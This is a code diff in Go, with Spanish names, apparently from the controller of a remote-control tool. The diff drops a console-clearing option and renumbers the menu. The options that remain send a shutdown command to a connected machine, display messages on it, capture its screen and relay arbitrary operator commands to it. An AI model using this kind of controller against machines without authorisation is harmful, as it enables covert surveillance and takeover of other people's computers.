@@ -25,15 +25,14 @@ const INSTRUCCION = `
 //[ss] capturar pantalla  //
 `
 const (
-	OP1 = "limpiar consola"
-	OP2 = "apagar equipo"
-	OP3 = "enviar mensaje"
-	OP4 = "salir"
-	OP5 = "capturar pantalla"
-	OP6 = "enviar comando"
+	OP1 = "apagar equipo"
+	OP2 = "enviar mensaje"
+	OP3 = "salir"
+	OP4 = "capturar pantalla"
+	OP5 = "enviar comando"
 )
 
-var Instrucciones = []string{OP1, OP2, OP3, OP4, OP5, OP6}
+var Instrucciones = []string{OP1, OP2, OP3, OP4, OP5}
 
 const (
 	TIMEOUT = 10   // tiempo en segundos que espera el cliente para recibir un paquete
@@ -79,29 +78,26 @@ func Comando(conexiones net.Conn) error {
 	fmt.Print("\n")
 
 	switch eleccion {
-	case OP1: // borrar consola
 
-		consola.Borrar_consola()
-
-	case OP2: // apagar equipo
+	case OP1: // apagar equipo
 		err := envio(conexiones, "shutdown /s")
 		if err != nil {
 			return err
 		}
-	case OP3:
+	case OP2:
 
 		mensaje := input.Input("mensaje >> ")
 
 		envio(conexiones, fmt.Sprintf("msn-%s", mensaje))
 
-	case OP4:
+	case OP3:
 		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
 		envio(conexiones, "q")
 		defer conexiones.Close()
 		fmt.Print("\033[?1049l")
 		os.Exit(0)
 
-	case OP5:
+	case OP4:
 
 		ch_img := make(chan []byte)
 		ch_err := make(chan error)
@@ -137,7 +133,7 @@ func Comando(conexiones net.Conn) error {
 			}
 
 		}
-	case OP6:
+	case OP5:
 		fmt.Print("\n")
 		entrada := input.Input("[#] enviar comando >> ")
 		fmt.Print("\n")
